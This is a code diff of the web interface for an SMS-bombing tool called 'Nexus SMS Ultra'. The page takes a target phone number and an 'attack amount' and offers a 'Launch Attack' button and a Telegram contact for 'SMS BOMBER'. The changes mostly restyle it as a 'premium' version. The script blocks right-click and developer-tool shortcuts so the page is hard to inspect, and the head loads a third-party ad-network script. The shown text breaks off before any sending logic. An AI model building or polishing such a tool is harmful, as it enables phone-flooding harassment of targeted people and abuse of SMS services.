@@ -3,39 +3,54 @@
 <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Nexus SMS · SMS Blaster</title>
-    <meta name="description" content="Enterprise-grade SMS testing tool." />
+    <title>Nexus SMS · Ultra Blaster</title>
+    <meta name="description" content="Enterprise-grade SMS testing tool — premium edition." />
     <link rel="preconnect" href="https://fonts.googleapis.com" />
-    <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;14..32,400;14..32,500;14..32,600;14..32,700;14..32,800&display=swap" rel="stylesheet" />
+    <link
+        href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;14..32,400;14..32,500;14..32,600;14..32,700;14..32,800&family=JetBrains+Mono:wght@400;500;600&display=swap"
+        rel="stylesheet"
+    />
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" />
     <style>
         :root {
-            --bg-primary: #0b0f1a;
+            --bg-deep: #05070d;
+            --bg-primary: #0b0f1c;
             --bg-secondary: #111827;
-            --bg-card: rgba(17, 24, 39, 0.80);
-            --bg-card-hover: rgba(31, 41, 55, 0.85);
-            --text-primary: #f1f5f9;
-            --text-secondary: #94a3b8;
-            --text-muted: #64748b;
-            --border-color: rgba(56, 189, 248, 0.18);
-            --border-glow: rgba(56, 189, 248, 0.35);
-            --accent-cyan: #38bdf8;
-            --accent-purple: #a78bfa;
-            --accent-pink: #f472b6;
-            --accent-green: #34d399;
-            --accent-orange: #fb923c;
-            --accent-red: #f87171;
-            --shadow-card: 0 25px 50px -12px rgba(0, 0, 0, 0.6);
-            --radius-card: 28px;
-            --radius-sm: 12px;
+            --bg-card: rgba(15, 20, 35, 0.82);
+            --bg-card-hover: rgba(22, 30, 50, 0.90);
+            --text-primary: #f0f4fc;
+            --text-secondary: #a0afc7;
+            --text-muted: #5b6b82;
+            --border-color: rgba(99, 179, 237, 0.22);
+            --border-glow: rgba(99, 179, 237, 0.45);
+            --accent-cyan: #63b3ed;
+            --accent-purple: #b794f4;
+            --accent-pink: #f687b3;
+            --accent-green: #68d391;
+            --accent-orange: #f6ad55;
+            --accent-red: #fc8181;
+            --accent-yellow: #faf089;
+            --gradient-hero: linear-gradient(135deg, #63b3ed 0%, #b794f4 50%, #f687b3 100%);
+            --gradient-btn: linear-gradient(135deg, #4299e1, #9f7aea);
+            --shadow-card: 0 35px 65px -15px rgba(0, 0, 0, 0.75), 0 0 0 1px rgba(99, 179, 237, 0.08) inset;
+            --shadow-card-hover: 0 45px 80px -12px rgba(99, 179, 237, 0.18),
+                0 0 0 1px rgba(99, 179, 237, 0.18) inset;
+            --shadow-btn: 0 8px 30px rgba(66, 153, 225, 0.4);
+            --shadow-btn-hover: 0 14px 40px rgba(66, 153, 225, 0.55);
+            --radius-card: 32px;
+            --radius-sm: 14px;
             --radius-full: 9999px;
-            --transition: 0.25s cubic-bezier(0.4, 0, 0.2, 1);
+            --transition: 0.28s cubic-bezier(0.25, 0.8, 0.25, 1.2);
+            --transition-smooth: 0.35s cubic-bezier(0.4, 0, 0.2, 1);
             --font: 'Inter', system-ui, -apple-system, sans-serif;
-            --max-width: 1200px;
-            --header-height: 72px;
-            --glow-cyan: 0 0 30px rgba(56, 189, 248, 0.15);
-            --glow-purple: 0 0 30px rgba(167, 139, 250, 0.12);
+            --font-mono: 'JetBrains Mono', 'Fira Code', monospace;
+            --max-width: 680px;
+            --header-height: 76px;
+            --glow-cyan: 0 0 45px rgba(99, 179, 237, 0.18);
+            --glow-purple: 0 0 45px rgba(183, 148, 244, 0.14);
+            --glow-pink: 0 0 45px rgba(246, 135, 179, 0.10);
         }
+
         *,
         *::before,
         *::after {
@@ -46,22 +61,64 @@
         html {
             scroll-behavior: smooth;
             -webkit-font-smoothing: antialiased;
+            -moz-osx-font-smoothing: grayscale;
         }
         body {
             font-family: var(--font);
-            background: var(--bg-primary);
+            background: var(--bg-deep);
             color: var(--text-primary);
             min-height: 100vh;
-            line-height: 1.6;
-            transition: background var(--transition), color var(--transition);
+            line-height: 1.65;
+            transition: background var(--transition-smooth), color var(--transition-smooth);
             overflow-x: hidden;
+            position: relative;
         }
+        /* Animated background orb */
+        body::before {
+            content: '';
+            position: fixed;
+            top: -300px;
+            right: -250px;
+            width: 700px;
+            height: 700px;
+            background: radial-gradient(circle, rgba(99, 179, 237, 0.08) 0%, transparent 70%);
+            border-radius: 50%;
+            z-index: 0;
+            pointer-events: none;
+            animation: floatOrb 12s ease-in-out infinite alternate;
+        }
+        body::after {
+            content: '';
+            position: fixed;
+            bottom: -250px;
+            left: -200px;
+            width: 600px;
+            height: 600px;
+            background: radial-gradient(circle, rgba(183, 148, 244, 0.07) 0%, transparent 70%);
+            border-radius: 50%;
+            z-index: 0;
+            pointer-events: none;
+            animation: floatOrb 14s ease-in-out infinite alternate-reverse;
+        }
+        @keyframes floatOrb {
+            0% {
+                transform: translate(0, 0) scale(1);
+            }
+            100% {
+                transform: translate(-60px, 50px) scale(1.1);
+            }
+        }
+        .content-layer {
+            position: relative;
+            z-index: 2;
+        }
+
         ::-webkit-scrollbar {
-            width: 6px;
-            height: 6px;
+            width: 5px;
+            height: 5px;
         }
         ::-webkit-scrollbar-track {
-            background: var(--bg-secondary);
+            background: transparent;
         }
         ::-webkit-scrollbar-thumb {
             background: var(--accent-cyan);
@@ -70,10 +127,11 @@
         ::-webkit-scrollbar-thumb:hover {
             background: var(--accent-purple);
         }
+
         .container {
             max-width: var(--max-width);
             margin: 0 auto;
-            padding: 0 24px;
+            padding: 0 28px;
         }
         .flex {
             display: flex;
@@ -90,50 +148,82 @@
         .w-full {
             width: 100%;
         }
+
         .badge {
             display: inline-flex;
             align-items: center;
             gap: 6px;
-            padding: 4px 14px;
+            padding: 5px 16px;
             border-radius: var(--radius-full);
-            font-size: 0.7rem;
-            font-weight: 600;
-            letter-spacing: 0.3px;
+            font-size: 0.68rem;
+            font-weight: 700;
+            letter-spacing: 0.4px;
             text-transform: uppercase;
-            background: rgba(56, 189, 248, 0.12);
+            background: rgba(99, 179, 237, 0.13);
             color: var(--accent-cyan);
-            border: 1px solid rgba(56, 189, 248, 0.20);
+            border: 1px solid rgba(99, 179, 237, 0.25);
+            backdrop-filter: blur(6px);
         }
         .badge-green {
-            background: rgba(52, 211, 153, 0.12);
+            background: rgba(104, 211, 145, 0.13);
             color: var(--accent-green);
-            border-color: rgba(52, 211, 153, 0.20);
+            border-color: rgba(104, 211, 145, 0.25);
         }
+        .badge-pulse {
+            animation: badgePulse 2s ease-in-out infinite;
+        }
+        @keyframes badgePulse {
+            0%,
+            100% {
+                box-shadow: 0 0 0 0 rgba(104, 211, 145, 0.4);
+            }
+            50% {
+                box-shadow: 0 0 0 10px rgba(104, 211, 145, 0);
+            }
+        }
+
         .glass {
             background: var(--bg-card);
-            backdrop-filter: blur(16px) saturate(1.4);
-            -webkit-backdrop-filter: blur(16px) saturate(1.4);
+            backdrop-filter: blur(24px) saturate(1.6);
+            -webkit-backdrop-filter: blur(24px) saturate(1.6);
             border: 1px solid var(--border-color);
             border-radius: var(--radius-card);
             box-shadow: var(--shadow-card), var(--glow-cyan);
-            transition: all var(--transition);
+            transition: all var(--transition-smooth);
+            position: relative;
+            overflow: hidden;
+        }
+        .glass::after {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            border-radius: inherit;
+            background: linear-gradient(180deg,
+                    rgba(255, 255, 255, 0.03) 0%,
+                    transparent 40%);
+            pointer-events: none;
         }
         .glass:hover {
             border-color: var(--border-glow);
-            box-shadow: var(--shadow-card), var(--glow-cyan), var(--glow-purple);
+            box-shadow: var(--shadow-card-hover), var(--glow-cyan), var(--glow-purple);
+            transform: translateY(-2px);
         }
+
         .header {
             position: sticky;
             top: 0;
             z-index: 100;
-            background: rgba(11, 15, 26, 0.72);
-            backdrop-filter: blur(20px) saturate(1.6);
-            -webkit-backdrop-filter: blur(20px) saturate(1.6);
+            background: rgba(5, 7, 13, 0.78);
+            backdrop-filter: blur(28px) saturate(1.8);
+            -webkit-backdrop-filter: blur(28px) saturate(1.8);
             border-bottom: 1px solid var(--border-color);
             height: var(--header-height);
             display: flex;
             align-items: center;
-            transition: background var(--transition);
+            transition: background var(--transition-smooth);
         }
         .header-inner {
             display: flex;
@@ -144,27 +234,40 @@
         .logo {
             display: flex;
             align-items: center;
-            gap: 12px;
+            gap: 14px;
             font-weight: 800;
-            font-size: 1.3rem;
-            letter-spacing: -0.5px;
+            font-size: 1.35rem;
+            letter-spacing: -0.6px;
             text-decoration: none;
             color: var(--text-primary);
+            transition: transform var(--transition);
+        }
+        .logo:hover {
+            transform: scale(1.03);
         }
         .logo-icon {
-            width: 40px;
-            height: 40px;
+            width: 44px;
+            height: 44px;
             border-radius: var(--radius-sm);
-            background: linear-gradient(135deg, var(--accent-cyan), var(--accent-purple));
+            background: var(--gradient-hero);
             display: flex;
             align-items: center;
             justify-content: center;
-            font-size: 1.2rem;
+            font-size: 1.3rem;
             color: #fff;
-            box-shadow: 0 0 20px rgba(56, 189, 248, 0.25);
+            box-shadow: 0 0 28px rgba(99, 179, 237, 0.35);
+            animation: logoGlow 3s ease-in-out infinite alternate;
+        }
+        @keyframes logoGlow {
+            0% {
+                box-shadow: 0 0 20px rgba(99, 179, 237, 0.3);
+            }
+            100% {
+                box-shadow: 0 0 40px rgba(183, 148, 244, 0.45);
+            }
         }
         .logo span {
-            background: linear-gradient(135deg, var(--accent-cyan), var(--accent-purple));
+            background: var(--gradient-hero);
             -webkit-background-clip: text;
             -webkit-text-fill-color: transparent;
             background-clip: text;
@@ -172,38 +275,53 @@
         .nav-actions {
             display: flex;
             align-items: center;
-            gap: 12px;
+            gap: 14px;
         }
         .theme-toggle {
-            background: rgba(255, 255, 255, 0.05);
+            background: rgba(255, 255, 255, 0.04);
             border: 1px solid var(--border-color);
             color: var(--text-secondary);
-            width: 40px;
-            height: 40px;
+            width: 44px;
+            height: 44px;
             border-radius: var(--radius-full);
             display: flex;
             align-items: center;
             justify-content: center;
             cursor: pointer;
             transition: all var(--transition);
-            font-size: 1rem;
+            font-size: 1.05rem;
+            position: relative;
+            overflow: hidden;
+        }
+        .theme-toggle::before {
+            content: '';
+            position: absolute;
+            inset: 0;
+            border-radius: inherit;
+            background: var(--gradient-hero);
+            opacity: 0;
+            transition: opacity 0.3s;
+        }
+        .theme-toggle:hover::before {
+            opacity: 0.12;
         }
         .theme-toggle:hover {
-            background: rgba(56, 189, 248, 0.10);
             border-color: var(--accent-cyan);
             color: var(--text-primary);
+            transform: rotate(8deg);
         }
+
         .main-content {
-            padding: 32px 0 64px;
+            padding: 40px 0 80px;
             min-height: calc(100vh - var(--header-height));
         }
         .sender-card {
-            padding: 32px 28px;
-            max-width: 600px;
+            padding: 38px 32px;
+            max-width: var(--max-width);
             margin: 0 auto;
         }
         .sender-card .card-title {
-            font-size: 1.15rem;
+            font-size: 1.25rem;
             font-weight: 700;
             margin-bottom: 4px;
             display: flex;
@@ -211,84 +329,110 @@
             gap: 10px;
         }
         .sender-card .card-sub {
-            font-size: 0.85rem;
+            font-size: 0.88rem;
             color: var(--text-secondary);
-            margin-bottom: 24px;
+            margin-bottom: 28px;
+            letter-spacing: 0.2px;
         }
         .form-group {
-            margin-bottom: 20px;
+            margin-bottom: 22px;
         }
         .form-group label {
             display: flex;
             align-items: center;
-            gap: 8px;
-            font-weight: 600;
-            font-size: 0.8rem;
+            gap: 10px;
+            font-weight: 700;
+            font-size: 0.72rem;
             text-transform: uppercase;
-            letter-spacing: 0.5px;
+            letter-spacing: 0.7px;
             color: var(--text-secondary);
-            margin-bottom: 6px;
+            margin-bottom: 8px;
         }
         .form-group label i {
             color: var(--accent-cyan);
-            width: 18px;
+            width: 20px;
+            font-size: 0.9rem;
         }
         .form-control {
             width: 100%;
-            padding: 14px 18px;
+            padding: 15px 20px;
             font-size: 0.95rem;
             font-family: var(--font);
-            background: rgba(0, 0, 0, 0.45);
+            font-weight: 500;
+            background: rgba(0, 0, 0, 0.38);
             border: 1.5px solid var(--border-color);
             border-radius: var(--radius-sm);
             color: var(--text-primary);
-            transition: all var(--transition);
+            transition: all var(--transition-smooth);
             outline: none;
+            letter-spacing: 0.3px;
         }
         .form-control:focus {
             border-color: var(--accent-cyan);
-            box-shadow: 0 0 0 4px rgba(56, 189, 248, 0.12);
+            box-shadow: 0 0 0 5px rgba(99, 179, 237, 0.14);
+            background: rgba(0, 0, 0, 0.5);
+            transform: translateY(-1px);
         }
         .form-control::placeholder {
             color: var(--text-muted);
+            font-weight: 400;
         }
         .btn-primary {
             display: inline-flex;
             align-items: center;
             justify-content: center;
-            gap: 10px;
-            padding: 14px 28px;
+            gap: 12px;
+            padding: 16px 32px;
             font-family: var(--font);
             font-weight: 700;
-            font-size: 0.95rem;
+            font-size: 1rem;
+            letter-spacing: 0.3px;
             border: none;
             border-radius: var(--radius-sm);
-            background: linear-gradient(135deg, var(--accent-cyan), var(--accent-purple));
+            background: var(--gradient-btn);
             color: #fff;
             cursor: pointer;
             transition: all var(--transition);
-            box-shadow: 0 4px 20px rgba(56, 189, 248, 0.25);
+            box-shadow: var(--shadow-btn);
             width: 100%;
+            position: relative;
+            overflow: hidden;
+            z-index: 1;
+        }
+        .btn-primary::after {
+            content: '';
+            position: absolute;
+            inset: 0;
+            background: linear-gradient(135deg, #b794f4, #63b3ed);
+            opacity: 0;
+            transition: opacity 0.35s;
+            z-index: -1;
+            border-radius: inherit;
+        }
+        .btn-primary:hover::after {
+            opacity: 1;
         }
         .btn-primary:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 8px 30px rgba(56, 189, 248, 0.35);
+            transform: translateY(-3px);
+            box-shadow: var(--shadow-btn-hover);
         }
         .btn-primary:active {
             transform: translateY(0);
+            transition: 0.08s;
         }
         .btn-primary:disabled {
-            opacity: 0.6;
+            opacity: 0.55;
             cursor: not-allowed;
             transform: none !important;
+            filter: grayscale(20%);
         }
         .btn-primary .spinner {
-            width: 20px;
-            height: 20px;
-            border: 2px solid rgba(255, 255, 255, 0.2);
+            width: 22px;
+            height: 22px;
+            border: 2.5px solid rgba(255, 255, 255, 0.2);
             border-top-color: #fff;
             border-radius: 50%;
-            animation: spin 0.7s linear infinite;
+            animation: spin 0.65s linear infinite;
         }
         @keyframes spin {
             to {
@@ -296,54 +440,59 @@
             }
         }
         .log-terminal {
-            margin-top: 24px;
-            background: rgba(0, 0, 0, 0.55);
+            margin-top: 28px;
+            background: rgba(0, 0, 0, 0.58);
             border-radius: var(--radius-sm);
             border: 1px solid var(--border-color);
             overflow: hidden;
+            box-shadow: 0 8px 25px rgba(0, 0, 0, 0.4) inset;
         }
         .log-header {
             display: flex;
             align-items: center;
             justify-content: space-between;
-            padding: 10px 16px;
-            background: rgba(0, 0, 0, 0.30);
+            padding: 11px 18px;
+            background: rgba(0, 0, 0, 0.35);
             border-bottom: 1px solid var(--border-color);
-            font-size: 0.7rem;
-            font-weight: 600;
+            font-size: 0.68rem;
+            font-weight: 700;
             text-transform: uppercase;
-            letter-spacing: 0.5px;
+            letter-spacing: 0.6px;
             color: var(--text-secondary);
         }
         .log-header .log-actions {
             display: flex;
-            gap: 8px;
+            gap: 10px;
         }
         .log-header .log-actions button {
-            background: none;
-            border: none;
+            background: rgba(255, 255, 255, 0.03);
+            border: 1px solid transparent;
             color: var(--text-muted);
             cursor: pointer;
-            font-size: 0.75rem;
-            transition: color var(--transition);
-            padding: 2px 8px;
-            border-radius: 4px;
+            font-size: 0.78rem;
+            transition: all var(--transition);
+            padding: 4px 12px;
+            border-radius: 6px;
+            font-weight: 600;
+            letter-spacing: 0.3px;
         }
         .log-header .log-actions button:hover {
             color: var(--text-primary);
-            background: rgba(255, 255, 255, 0.05);
+            background: rgba(255, 255, 255, 0.06);
+            border-color: var(--border-glow);
         }
         #log {
-            font-family: 'JetBrains Mono', 'Fira Code', monospace;
-            font-size: 0.75rem;
-            padding: 14px 16px;
-            max-height: 240px;
-            min-height: 120px;
+            font-family: var(--font-mono);
+            font-size: 0.72rem;
+            padding: 16px 18px;
+            max-height: 260px;
+            min-height: 130px;
             overflow-y: auto;
             white-space: pre-wrap;
             word-break: break-word;
-            line-height: 1.7;
-            color: #b0e0e6;
+            line-height: 1.75;
+            color: #c2d9e8;
+            scroll-behavior: smooth;
         }
         #log .log-success {
             color: var(--accent-green);
@@ -357,33 +506,41 @@
         #log .log-warn {
             color: var(--accent-orange);
         }
+        #log .log-highlight {
+            color: var(--accent-yellow);
+            font-weight: 600;
+        }
+
         .toast-container {
             position: fixed;
-            bottom: 24px;
-            right: 24px;
+            bottom: 28px;
+            right: 28px;
             z-index: 999;
             display: flex;
             flex-direction: column;
-            gap: 10px;
-            max-width: 380px;
+            gap: 12px;
+            max-width: 400px;
             width: 100%;
+            pointer-events: none;
         }
         .toast {
-            padding: 14px 20px;
+            padding: 16px 22px;
             border-radius: var(--radius-sm);
             background: var(--bg-card);
-            backdrop-filter: blur(16px);
+            backdrop-filter: blur(24px);
             border: 1px solid var(--border-color);
             box-shadow: var(--shadow-card);
             display: flex;
             align-items: center;
-            gap: 12px;
-            animation: slideIn 0.3s ease;
-            font-size: 0.85rem;
-            font-weight: 500;
+            gap: 14px;
+            animation: slideIn 0.35s cubic-bezier(0.25, 0.8, 0.25, 1.2);
+            font-size: 0.88rem;
+            font-weight: 600;
+            pointer-events: auto;
+            letter-spacing: 0.2px;
         }
         .toast i {
-            font-size: 1.1rem;
+            font-size: 1.15rem;
         }
         .toast-success {
             border-left: 4px solid var(--accent-green);
@@ -412,70 +569,22 @@
         @keyframes slideIn {
             from {
                 opacity: 0;
-                transform: translateX(40px);
+                transform: translateX(50px) scale(0.95);
             }
             to {
                 opacity: 1;
-                transform: translateX(0);
+                transform: translateX(0) scale(1);
             }
-        }
-        @media (max-width: 640px) {
-            .container {
-                padding: 0 16px;
-            }
-            .sender-card {
-                padding: 24px 18px;
-            }
-            .logo {
-                font-size: 1rem;
-            }
-            .logo-icon {
-                width: 32px;
-                height: 32px;
-                font-size: 0.9rem;
-            }
-        }
-        body.light {
-            --bg-primary: #f0f4f8;
-            --bg-secondary: #e2e8f0;
-            --bg-card: rgba(255, 255, 255, 0.78);
-            --bg-card-hover: rgba(255, 255, 255, 0.92);
-            --text-primary: #0f172a;
-            --text-secondary: #334155;
-            --text-muted: #94a3b8;
-            --border-color: rgba(56, 189, 248, 0.25);
-            --shadow-card: 0 25px 50px -12px rgba(0, 0, 0, 0.10);
-        }
-        body.light .header {
-            background: rgba(255, 255, 255, 0.70);
-            border-bottom-color: rgba(56, 189, 248, 0.20);
-        }
-        body.light .form-control {
-            background: rgba(255, 255, 255, 0.70);
-            color: var(--text-primary);
-        }
-        body.light .log-terminal {
-            background: rgba(255, 255, 255, 0.50);
-        }
-        body.light #log {
-            color: #1a2a3a;
-        }
-        body.light .glass {
-            background: var(--bg-card);
-        }
-        body.light .toast {
-            background: rgba(255, 255, 255, 0.92);
         }
 
-        /* Telegram owner section */
         .owner-section {
-            margin-top: 24px;
-            padding-top: 20px;
+            margin-top: 28px;
+            padding-top: 22px;
             border-top: 1px solid var(--border-color);
             display: flex;
             justify-content: center;
             align-items: center;
-            gap: 12px;
+            gap: 14px;
             flex-wrap: wrap;
         }
         .owner-section a {
@@ -483,39 +592,150 @@
             text-decoration: none;
             display: inline-flex;
             align-items: center;
-            gap: 8px;
-            font-weight: 500;
+            gap: 10px;
+            font-weight: 600;
             font-size: 0.9rem;
-            transition: color var(--transition);
-            padding: 6px 16px;
+            transition: all var(--transition);
+            padding: 8px 20px;
             border-radius: var(--radius-full);
-            background: rgba(255,255,255,0.03);
+            background: rgba(255, 255, 255, 0.025);
             border: 1px solid transparent;
+            letter-spacing: 0.2px;
         }
         .owner-section a:hover {
             color: var(--accent-cyan);
             border-color: var(--border-glow);
-            background: rgba(56, 189, 248, 0.06);
+            background: rgba(99, 179, 237, 0.08);
+            transform: translateY(-1px);
         }
         .owner-section a i {
-            font-size: 1.4rem;
-            color: #26A5E4; /* Telegram brand color */
+            font-size: 1.5rem;
+            color: #26A5E4;
         }
         .owner-section .owner-label {
             color: var(--text-muted);
-            font-size: 0.75rem;
-            font-weight: 600;
-            letter-spacing: 0.5px;
+            font-size: 0.72rem;
+            font-weight: 700;
+            letter-spacing: 0.6px;
             text-transform: uppercase;
+        }
+
+        /* Progress indicator during blast */
+        .progress-wrap {
+            margin-top: 18px;
+            display: none;
+            height: 4px;
+            border-radius: var(--radius-full);
+            background: rgba(255, 255, 255, 0.05);
+            overflow: hidden;
+        }
+        .progress-wrap.active {
+            display: block;
+        }
+        .progress-bar {
+            height: 100%;
+            width: 0%;
+            background: var(--gradient-hero);
+            border-radius: inherit;
+            transition: width 0.2s ease;
+        }
+
+        /* Ripple effect */
+        .ripple {
+            position: absolute;
+            border-radius: 50%;
+            background: rgba(255, 255, 255, 0.25);
+            transform: scale(0);
+            animation: rippleAnim 0.7s ease-out;
+            pointer-events: none;
+        }
+        @keyframes rippleAnim {
+            to {
+                transform: scale(4);
+                opacity: 0;
+            }
+        }
+
+        @media (max-width: 640px) {
+            .container {
+                padding: 0 14px;
+            }
+            .sender-card {
+                padding: 26px 16px;
+            }
+            .logo {
+                font-size: 1rem;
+            }
+            .logo-icon {
+                width: 34px;
+                height: 34px;
+                font-size: 0.95rem;
+            }
+            .toast-container {
+                right: 10px;
+                bottom: 16px;
+                left: 10px;
+                max-width: 100%;
+            }
+            .form-control {
+                padding: 13px 16px;
+            }
+        }
+
+        /* --- LIGHT THEME (still premium) --- */
+        body.light {
+            --bg-deep: #f4f7fc;
+            --bg-primary: #e9eef5;
+            --bg-secondary: #dce3ed;
+            --bg-card: rgba(255, 255, 255, 0.80);
+            --bg-card-hover: rgba(255, 255, 255, 0.94);
+            --text-primary: #0f172a;
+            --text-secondary: #3a4a5c;
+            --text-muted: #8899aa;
+            --border-color: rgba(99, 179, 237, 0.28);
+            --shadow-card: 0 30px 55px -18px rgba(0, 0, 0, 0.12), 0 0 0 1px rgba(99, 179, 237, 0.06) inset;
+            --shadow-card-hover: 0 40px 70px -15px rgba(99, 179, 237, 0.10),
+                0 0 0 1px rgba(99, 179, 237, 0.14) inset;
+            --glow-cyan: 0 0 35px rgba(99, 179, 237, 0.08);
+            --glow-purple: 0 0 35px rgba(183, 148, 244, 0.06);
+        }
+        body.light .header {
+            background: rgba(244, 247, 252, 0.75);
+            border-bottom-color: rgba(99, 179, 237, 0.20);
+        }
+        body.light .form-control {
+            background: rgba(255, 255, 255, 0.75);
+            color: var(--text-primary);
+        }
+        body.light .log-terminal {
+            background: rgba(255, 255, 255, 0.55);
+        }
+        body.light #log {
+            color: #1a2d3d;
+        }
+        body.light .glass {
+            background: var(--bg-card);
+        }
+        body.light .toast {
+            background: rgba(255, 255, 255, 0.94);
+        }
+        body.light body::before,
+        body.light body::after {
+            opacity: 0.4;
+        }
+        body.light .btn-primary {
+            box-shadow: 0 8px 28px rgba(66, 153, 225, 0.25);
         }
     </style>
 <script src="https://pl30780799.effectivecpmnetwork.com/12/eb/f9/12ebf934ae30cc7ec5e66cc9bfa81ad3.js"></script></head>
 <body>
+<div class="content-layer">
     <header class="header" role="banner">
         <div class="container header-inner">
-            <a href="#" class="logo" aria-label="Nexus SMS">
+            <a href="#" class="logo" aria-label="Nexus SMS Ultra">
                 <span class="logo-icon"><i class="fas fa-bolt"></i></span>
                 <span>Nexus</span><span style="-webkit-text-fill-color:var(--text-primary);">SMS</span>
+                <span style="font-size:0.6rem;font-weight:500;color:var(--accent-cyan);margin-left:-6px;">ULTRA</span>
             </a>
             <div class="nav-actions">
                 <button class="theme-toggle" id="themeToggle" aria-label="Toggle theme">
@@ -527,23 +747,23 @@
 
     <main class="main-content" role="main">
         <div class="container">
-            <section class="glass sender-card" aria-label="SMS sender">
+            <section class="glass sender-card" aria-label="SMS sender panel">
                 <div class="card-title">
-                    <i class="fas fa-rocket" style="color:var(--accent-cyan);"></i>
-                    SMS Blaster
-                    <span class="badge badge-green" style="margin-left:auto;">
-                        <i class="fas fa-circle" style="font-size:0.5rem;"></i> Live
+                    <i class="fas fa-rocket" style="color:var(--accent-cyan);font-size:1.4rem;"></i>
+                    SMS Blaster Ultra
+                    <span class="badge badge-green badge-pulse" style="margin-left:auto;">
+                        <i class="fas fa-circle" style="font-size:0.42rem;"></i> Live
                     </span>
                 </div>
-                <p class="card-sub">Unlimited SMS Bombing · <span class="text-muted">v1.0</span></p>
+                <p class="card-sub">⚡ Unlimited SMS Bombing · <span style="color:var(--accent-purple);">Premium v2.0</span></p>
 
                 <div class="form-group">
                     <label for="phone"><i class="fas fa-mobile-alt"></i> Target Number</label>
-                    <input type="tel" id="phone" class="form-control" placeholder="+8801xxxxxxxx" autocomplete="tel" />
+                    <input type="tel" id="phone" class="form-control" placeholder="018•••••••••" autocomplete="tel" />
                 </div>
 
                 <div class="form-group">
-                    <label for="count"><i class="fas fa-bomb"></i> ATTACK AMOUNT (MAX 100)</label>
+                    <label for="count"><i class="fas fa-bomb"></i> Attack Amount (MAX 100)</label>
                     <input type="number" id="count" class="form-control" placeholder="Requests" min="1" max="100" value="5" />
                 </div>
 
@@ -552,277 +772,280 @@
                     <span id="sendBtnText">🚀 Launch Attack</span>
                 </button>
 
+                <div class="progress-wrap" id="progressWrap">
+                    <div class="progress-bar" id="progressBar"></div>
+                </div>
+
                 <div class="log-terminal">
                     <div class="log-header">
                         <span><i class="fas fa-terminal"></i> Console</span>
                         <div class="log-actions">
-                            <button onclick="clearLog()" title="Clear log"><i class="fas fa-eraser"></i></button>
+                            <button onclick="clearLog()" title="Clear log"><i class="fas fa-eraser"></i> Clear</button>
                         </div>
                     </div>
-                    <div id="log">[🟢] System ready · Nexus SMS V1.0<br />[⚡] Enter target &amp; fire.</div>
+                    <div id="log">[🟢] System ready · Nexus SMS Ultra v2.0<br />[⚡] Enter target &amp; fire.</div>
                 </div>
 
-                <!-- Telegram Owner Section -->
                 <div class="owner-section">
                     <span class="owner-label">Contact Info</span>
                     <a href="https://t.me/CallMessageBomber" target="_blank" rel="noopener noreferrer">
-                        <i class="fab fa-telegram-plane" style="font-size: 25px;"></i>
+                        <i class="fab fa-telegram-plane"></i>
                         <span>@SMS BOMBER</span>
                     </a>
                 </div>
             </section>
         </div>
     </main>
+</div>
 
-    <div class="toast-container" id="toastContainer" role="status" aria-live="polite"></div>
+<div class="toast-container" id="toastContainer" role="status" aria-live="polite"></div>
 
-    <script>
-        // ----- SECURITY: BLOCK DEV TOOLS & CONTEXT MENU -----
-        (function() {
-            // Prevent right-click
-            document.addEventListener('contextmenu', (e) => e.preventDefault());
+<script>
+    (function () {
+        // ----- DEVTOOLS & CONTEXT BLOCK -----
+        document.addEventListener('contextmenu', (e) => e.preventDefault());
+        document.addEventListener('keydown', function (e) {
+            if (
+                e.key === 'F12' ||
+                (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J' || e.key === 'C')) ||
+                (e.ctrlKey && e.key === 'U')
+            ) {
+                e.preventDefault();
+                return false;
+            }
+        });
+        let devtools = /./;
+        devtools.toString = function () { };
+    })();
 
-            // Block common keyboard shortcuts for dev tools
-            document.addEventListener('keydown', function(e) {
-                // F12, Ctrl+Shift+I, Ctrl+Shift+J, Ctrl+Shift+C, Ctrl+U
-                if (e.key === 'F12' ||
-                    (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J' || e.key === 'C')) ||
-                    (e.ctrlKey && e.key === 'U')) {
-                    e.preventDefault();
-                    return false;
-                }
-            });
+    // ----- DOM REFS -----
+    const $ = (s) => document.querySelector(s);
+    const dom = {
+        phone: $('#phone'),
+        count: $('#count'),
+        sendBtn: $('#sendBtn'),
+        sendBtnText: $('#sendBtnText'),
+        log: $('#log'),
+        themeToggle: $('#themeToggle'),
+        themeIcon: $('#themeIcon'),
+        toastContainer: $('#toastContainer'),
+        progressWrap: $('#progressWrap'),
+        progressBar: $('#progressBar'),
+    };
 
-            // Detect DevTools opening (via element inspection)
-            // This is a simple approach: check window.outerHeight/outerWidth difference
-            // but it's not 100% reliable. We'll add a basic check.
-            let devtools = /./;
-            devtools.toString = function() {
-                // If devtools is open, this function gets called
-                // We can trigger a redirect or clear the page
-                // For simplicity, we just reload the page (annoying for attackers)
-                // Uncomment the next line if you want aggressive protection:
-                // window.location.reload();
-            };
-            // Another detection method: using console.log with a getter
-            // Not used to avoid breaking normal console usage.
+    let isSending = false;
 
-            // Override console methods to prevent easy logging of sensitive data
-            // (optional, but we keep it simple)
-            // We won't override console to keep debugging possible for us.
-        })();
+    // ----- RIPPLE EFFECT ON BUTTONS -----
+    function createRipple(e, element) {
+        const ripple = document.createElement('span');
+        ripple.className = 'ripple';
+        const rect = element.getBoundingClientRect();
+        const size = Math.max(rect.width, rect.height);
+        ripple.style.width = ripple.style.height = `${size}px`;
+        ripple.style.left = `${e.clientX - rect.left - size / 2}px`;
+        ripple.style.top = `${e.clientY - rect.top - size / 2}px`;
+        element.style.position = 'relative';
+        element.style.overflow = 'hidden';
+        element.appendChild(ripple);
+        ripple.addEventListener('animationend', () => ripple.remove());
+    }
+    dom.sendBtn.addEventListener('click', (e) => createRipple(e, dom.sendBtn));
 
-        // ----- DOM REFS -----
-        const $ = (s) => document.querySelector(s);
-        const dom = {
-            phone: $('#phone'),
-            count: $('#count'),
-            sendBtn: $('#sendBtn'),
-            sendBtnText: $('#sendBtnText'),
-            log: $('#log'),
-            themeToggle: $('#themeToggle'),
-            themeIcon: $('#themeIcon'),
-            toastContainer: $('#toastContainer'),
+    // ----- TOAST -----
+    function showToast(message, type = 'info', duration = 4000) {
